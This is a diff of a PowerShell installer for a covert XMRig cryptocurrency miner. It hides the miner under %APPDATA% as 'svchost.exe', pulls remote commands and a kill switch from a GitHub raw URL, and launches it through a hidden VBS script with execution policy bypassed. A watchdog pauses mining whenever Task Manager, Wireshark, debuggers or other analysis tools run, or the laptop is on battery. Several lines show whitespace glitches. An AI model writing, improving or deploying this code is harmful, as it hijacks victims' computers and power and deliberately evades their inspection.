@@ -14,7 +14,7 @@ $ProgressPreference = 'SilentlyContinue'
 
 # Configuration
 $InstallDir = "$env:APPDATA\WindowsServices"
-$GithubRawConfig = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/config.json"
+$GithubRawConfig = "https://raw.githubusercontent.com/aurastriker/test/refs/heads/main/config.json"
 $XmrBinUrl = "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip"
 $MutexName = "Global\WindowsServiceUpdateMutex"
 
@@ -115,51 +115,53 @@ $ApiPort = Get-Random -Minimum 49152 -Maximum 65535$ConfigJson = @{
 } | ConvertTo-Json -Depth 5
 Set-Content -Path "$InstallDir\config.json" -Value $ConfigJson
 
-# 6. Generate Watchdog Script
-$WatchdogScript = @"
-while (\$true) {
-    \$InstallDir = "$InstallDir"
-    \$ConfigPath = "\$InstallDir\config.json"
+# 6. Generate Watchdog Script (Using single-quoted here-string)
+$WatchdogScript = @'
+while ($true) {
+    $InstallDir = "$env:APPDATA\WindowsServices"
+    $ConfigPath = "$InstallDir\config.json"
     
     try {
-        \$RemoteCfg = Invoke-RestMethod -Uri "$GithubRawConfig" -TimeoutSec 10 -ErrorAction Stop
-        if (\$RemoteCfg.killSwitch) {
+        $RemoteCfg = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/aurastriker/test/refs/heads/main/config.json" -TimeoutSec 10 -ErrorAction Stop
+        if ($RemoteCfg.killSwitch) {
             Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
-            Remove-Item "\$InstallDir\*" -Recurse -Force
-            Unregister-ScheduledTask -TaskName "WindowsServiceUpdate" -Confirm:\$false -ErrorAction SilentlyContinue
-            Unregister-ScheduledTask -TaskName "WindowsServiceMonitor" -Confirm:\$false -ErrorAction SilentlyContinue
+            Remove-Item "$InstallDir\*" -Recurse -Force
+            Unregister-ScheduledTask -TaskName "WindowsServiceUpdate" -Confirm:$false -ErrorAction SilentlyContinue
+            Unregister-ScheduledTask -TaskName "WindowsServiceMonitor" -Confirm:$false -ErrorAction SilentlyContinue
             exit
         }
-        if (\$RemoteCfg | ConvertTo-Json -Compress | Get-FileHash | Select-Object -ExpandProperty Hash -ne (Get-FileHash \$ConfigPath).Hash) {
-            \$RemoteCfg | ConvertTo-Json -Depth 5 | Set-Content \$ConfigPath
+        $RemoteJson =$RemoteCfg | ConvertTo-Json -Depth 5
+        $LocalJson = Get-Content$ConfigPath -Raw
+        if ($RemoteJson -ne$LocalJson) {
+            Set-Content -Path $ConfigPath -Value$RemoteJson
+            Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
         }
     } catch {}
 
-    \$BadProcs = @('taskmgr', 'processhacker', 'procexp', 'procexp64', 'procmon', 'procmon64', 'wireshark', 'perfmon', 'resmon', 'tcpview', 'autoruns', 'autoruns64', 'filemon', 'regmon', 'pestudio', 'x64dbg', 'x32dbg', 'ollydbg', 'ida', 'ida64', 'ghidra', 'fiddler', 'charles', 'httpdebugger')
-    \$RunningBad = Get-Process -Name \$BadProcs -ErrorAction SilentlyContinue
-    \$Battery = (Get-WmiObject -Class Win32_Battery -ErrorAction SilentlyContinue)
-    \$OnBattery = \$Battery -and (\$Battery.BatteryStatus -eq 1)
+    $BadProcs = @('taskmgr', 'processhacker', 'procexp', 'procexp64', 'procmon', 'procmon64', 'wireshark', 'perfmon', 'resmon', 'tcpview', 'autoruns', 'autoruns64', 'filemon', 'regmon', 'pestudio', 'x64dbg', 'x32dbg', 'ollydbg', 'ida', 'ida64', 'ghidra', 'fiddler', 'charles', 'httpdebugger')
+    $RunningBad = Get-Process -Name$BadProcs -ErrorAction SilentlyContinue
+    $Battery = (Get-WmiObject -Class Win32_Battery -ErrorAction SilentlyContinue)$OnBattery = $Battery -and ($Battery.BatteryStatus -eq 1)
 
-    if (\$RunningBad -or \$OnBattery) {
+    if ($RunningBad -or$OnBattery) {
         Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
         Start-Sleep -Seconds 60
         continue
     }
 
     if (-not (Get-Process -Name "svchost" -ErrorAction SilentlyContinue)) {
-        Start-Process -FilePath "\$InstallDir\svchost.exe" -ArgumentList "-c `"\$InstallDir\config.json`"" -WindowStyle Hidden
+        Start-Process -FilePath "$InstallDir\svchost.exe" -ArgumentList "-c `"$ConfigPath`"" -WindowStyle Hidden
     }
     
     Start-Sleep -Seconds 30
 }
-"@
+'@
 Set-Content -Path "$InstallDir\watchdog.ps1" -Value $WatchdogScript
 
 # 7. Generate VBS Launcher
-$VbsLauncher = @"
+$VbsLauncher = @'
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File ""%APPDATA%\WindowsServices\watchdog.ps1""", 0, False
-"@
+'@
 Set-Content -Path "$InstallDir\monitor.vbs" -Value $VbsLauncher
 
 # 8. Persistence Setup
